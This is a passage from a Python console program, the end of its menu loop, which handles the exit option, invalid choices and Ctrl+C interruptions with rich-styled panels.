                input("\nPress Enter to return to menu...")

            elif choice == "16":
                console.print(Panel("Exiting... Goodbye!", style="green"))
                try:
                    clear_screen()
                except Exception:
                    pass
                break

            else:
                console.print(Panel("Invalid choice! Please enter 1–16.", style="red"))
                time.sleep(1)

        except KeyboardInterrupt:
            console.print(Panel("⚠️ Exiting by user (Ctrl+C)...", style="yellow"))
            try:
                clear_screen()
            except Exception:
                pass
            break